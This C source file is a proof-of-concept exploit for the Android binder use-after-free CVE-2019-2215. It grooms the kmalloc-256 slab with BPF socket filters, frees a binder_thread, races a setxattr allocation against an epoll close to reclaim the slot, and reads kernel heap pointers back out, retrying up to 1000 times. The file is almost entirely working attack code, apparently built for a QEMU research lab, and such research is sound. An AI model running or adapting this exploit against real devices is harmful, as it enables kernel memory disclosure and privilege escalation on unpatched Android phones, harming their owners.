/*
 * cve_2019_2215_xattr2.c — Improved heap leak via xattr race
 *
 * Improvements over v1:
 * 1. Better slab grooming: fill kmalloc-256 BEFORE the UAF to ensure
 *    setxattr MUST reclaim the freed binder_thread slot
 * 2. Variable timing in closer thread to increase race window hit rate
 * 3. Higher attempt count
 * 4. Direct thread-based race (no fork overhead)
 *
 * Build: .\qemu\build-arm.bat src\cve_2019_2215_xattr2.c cve_2019_2215_xattr2
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <unistd.h>

/* Binder */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BC_ENTER_LOOPER         0x630c
struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

#define BT_WAIT_LOCK 44
#define BT_WAIT_NEXT 48
#define BT_WAIT_PREV 52

#define XATTR_NAME "user.leak"

/* Per-attempt state */
struct race_ctx {
    int binder_fd;
    int epfd;
    int spray_socks[256];
    int nspray;
    char xattr_path[128];
    int xattr_size;
    volatile int go;
    volatile int epfd_closed;
    int delay_loops;
};

/* Create a BPF filter for slab spray */
static int create_bpf_sock(void) {
    int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    /* 26 instructions → 228 bytes → kmalloc-256 */
    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
    struct sock_fprog prog = { .len = 26, .filter = insns };

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

static void *closer_thread(void *arg) {
    struct race_ctx *ctx = (struct race_ctx *)arg;
    while (!ctx->go) sched_yield();

    /* Variable delay to hit different points in the setxattr window */
    for (volatile int i = 0; i < ctx->delay_loops; i++);

    close(ctx->epfd);
    ctx->epfd_closed = 1;
    return NULL;
}

static int attempt_race(struct race_ctx *ctx) {
    int leaked = 0;

    /* Step 1: Spray kmalloc-256 to fill the slab */
    ctx->nspray = 0;
    for (int i = 0; i < 256; i++) {
        ctx->spray_socks[i] = create_bpf_sock();
        if (ctx->spray_socks[i] >= 0) ctx->nspray++;
        else break;
    }

    /* Step 2: Open binder + enter looper → creates binder_thread in kmalloc-256 */
    ctx->binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (ctx->binder_fd < 0) goto cleanup;

    uint32_t max = 0;
    ioctl(ctx->binder_fd, BINDER_SET_MAX_THREADS, &max);

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    ioctl(ctx->binder_fd, BINDER_WRITE_READ, &bwr);

    /* Step 3: Add to epoll */
    ctx->epfd = epoll_create1(O_CLOEXEC);
    if (ctx->epfd < 0) goto cleanup;

    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(ctx->epfd, EPOLL_CTL_ADD, ctx->binder_fd, &ev) < 0)
        goto cleanup;

    /* Step 4: BINDER_THREAD_EXIT → frees binder_thread.
     * Now there's ONE free slot in the filled kmalloc-256 slab. */
    int thr = 0;
    ioctl(ctx->binder_fd, BINDER_THREAD_EXIT, &thr);

    /* Step 5: Prepare xattr value */
    char *val = malloc(ctx->xattr_size);
    memset(val, 'Q', ctx->xattr_size);
    /* Ensure spinlock at BT_WAIT_LOCK is 0 */
    if (ctx->xattr_size > BT_WAIT_LOCK + 4)
        memset(val + BT_WAIT_LOCK, 0, 4);
    /* Place unique markers at corruption target */
    if (ctx->xattr_size > BT_WAIT_NEXT + 4)
        *(uint32_t*)(val + BT_WAIT_NEXT) = 0xDEADBEEF;
    if (ctx->xattr_size > BT_WAIT_PREV + 4)
        *(uint32_t*)(val + BT_WAIT_PREV) = 0xCAFEBABE;

    /* Create xattr file */
    int fd = open(ctx->xattr_path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { char c = 'x'; write(fd, &c, 1); close(fd); }

    /* Step 6: Start closer thread */
    ctx->go = 0;
    ctx->epfd_closed = 0;
    pthread_t tclose;
    pthread_create(&tclose, NULL, closer_thread, ctx);

    /* Step 7: setxattr → allocates in kmalloc-256, MUST reclaim the freed slot */
    ctx->go = 1;
    int ret = setxattr(ctx->xattr_path, XATTR_NAME, val, ctx->xattr_size, XATTR_CREATE);

    pthread_join(tclose, NULL);

    if (ret < 0) {
        /* setxattr failed, try removing first */
        removexattr(ctx->xattr_path, XATTR_NAME);
        free(val);
        goto cleanup;
    }

    /* Step 8: Read back xattr and check for corruption */
    char *rbuf = malloc(ctx->xattr_size);
    memset(rbuf, 0, ctx->xattr_size);
    ssize_t rlen = getxattr(ctx->xattr_path, XATTR_NAME, rbuf, ctx->xattr_size);

    if (rlen > BT_WAIT_PREV + 4) {
        uint32_t val_next = *(uint32_t*)(rbuf + BT_WAIT_NEXT);
        uint32_t val_prev = *(uint32_t*)(rbuf + BT_WAIT_PREV);

        if (val_next != 0xDEADBEEF || val_prev != 0xCAFEBABE) {
            printf("    CORRUPTION! next=0x%08x prev=0x%08x\n", val_next, val_prev);
            if (val_next >= 0xC0000000 && val_next < 0xF0000000) {
                printf("    ✓ KERNEL HEAP LEAK: 0x%08x\n", val_next);
                leaked = 1;
            }
        }
    }

    unlink(ctx->xattr_path);
    free(val);
    free(rbuf);

cleanup:
    if (ctx->binder_fd >= 0) close(ctx->binder_fd);
    /* epfd already closed by race thread (or close it now if thread didn't) */
    if (!ctx->epfd_closed && ctx->epfd >= 0) close(ctx->epfd);
    for (int i = 0; i < 256; i++)
        if (ctx->spray_socks[i] >= 0) close(ctx->spray_socks[i]);
    return leaked;
}

/* ========== Main ========== */
int main(int argc, char **argv) {
    int max_attempts = 1000;
    if (argc > 1) max_attempts = atoi(argv[1]);

    printf("=== CVE-2019-2215 Heap Leak v2 (xattr race) ===\n");
    printf("Attempts: %d, PID=%d\n\n", max_attempts, getpid());

    signal(SIGSEGV, SIG_IGN); /* ignore in parent, child handles */

    struct race_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.xattr_size = 200;

    int leaked = 0;
    for (int attempt = 0; attempt < max_attempts; attempt++) {
        if (attempt % 50 == 0) {
            printf("  [%d/%d] delay_range=[0,%d]...\n",
                   attempt, max_attempts, 200 + attempt/2);
            fflush(stdout);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            signal(SIGSEGV, SIG_DFL);

            /* Vary delay to probe different points in the race window */
            ctx.delay_loops = (attempt * 7 + 13) % (200 + attempt/2);

            snprintf(ctx.xattr_path, sizeof(ctx.xattr_path),
                     "/data/local/tmp/.xleak_%d", attempt);

            int r = attempt_race(&ctx);
            _exit(r > 0 ? 42 : 0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            printf("\n  ✓ LEAK at attempt %d!\n", attempt);
            leaked = 1;
            break;
        }
        if (WIFSIGNALED(status)) {
            printf("  [%d] child killed by signal %d\n", attempt, WTERMSIG(status));
        }
    }

    if (!leaked) {
        printf("\n  No leak in %d attempts.\n", max_attempts);
        printf("  The setxattr window may be too narrow for this race.\n");
        printf("  Consider: direct BPF exploitation or alternative vuln.\n");
    }

    return leaked ? 0 : 1;
}
